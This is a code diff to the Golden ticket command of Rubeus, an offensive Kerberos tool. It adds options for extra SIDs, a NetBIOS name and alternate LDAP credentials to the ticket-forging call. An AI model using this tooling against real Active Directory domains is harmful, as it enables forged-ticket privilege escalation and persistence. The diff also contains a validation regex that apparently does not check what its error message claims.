@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Text.RegularExpressions;
 
 namespace Rubeus.Commands
 {
@@ -20,7 +21,10 @@ namespace Rubeus.Commands
             string sid = "";
             int uid = 500;
             bool fromldap = false;
+            System.Net.NetworkCredential cred = null;
             string dc = "";
+            string netbios = "";
+            string sids = "";
 
             if (arguments.ContainsKey("/user"))
             {
@@ -39,6 +43,10 @@ namespace Rubeus.Commands
             {
                 domain = arguments["/domain"];
             }
+            if (arguments.ContainsKey("/netbios"))
+            {
+                netbios = arguments["/netbios"];
+            }
             if (arguments.ContainsKey("/outfile"))
             {
                 outfile = arguments["/outfile"];
@@ -47,11 +55,47 @@ namespace Rubeus.Commands
             {
                 sid = arguments["/sid"];
             }
+            if (arguments.ContainsKey("/sids"))
+            {
+                sids = arguments["/sids"];
+            }
             if (arguments.ContainsKey("/fromldap"))
             {
                 fromldap = true;
+                if (arguments.ContainsKey("/creduser"))
+                {
+                    // provide an alternate user to use for connection creds
+                    if (!Regex.IsMatch(arguments["/creduser"], ".+\\.+", RegexOptions.IgnoreCase))
+                    {
+                        Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
+                        return;
+                    }
+
+                    try
+                    {
+                        string[] parts = arguments["/creduser"].Split('\\');
+                        string domainName = parts[0];
+                        string userName = parts[1];
+
+                        // provide an alternate password to use for connection creds
+                        if (!arguments.ContainsKey("/credpassword"))
+                        {
+                            Console.WriteLine("\r\n[X] /credpassword is required when specifying /creduser\r\n");
+                            return;
+                        }
+
+                        string password = arguments["/credpassword"];
+
+                        cred = new System.Net.NetworkCredential(userName, password, domainName);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
+                        return;
+                    }
+                }
             }
-            if (arguments.ContainsKey("/uid"))
+                if (arguments.ContainsKey("/uid"))
             {
                 uid = Int32.Parse(arguments["/uid"]);
             }
@@ -137,7 +181,7 @@ namespace Rubeus.Commands
             }
             else
             {
-                ForgeTickets.ForgeTicket(user, String.Format("krbtgt/{0}", domain), hash, encType, fromldap, sid, domain, dc, uid, outfile, ptt);
+                ForgeTickets.ForgeTicket(user, String.Format("krbtgt/{0}", domain), hash, encType, fromldap, cred, sid, domain, netbios, dc, uid, sids, outfile, ptt);
                 return;
             }
         }
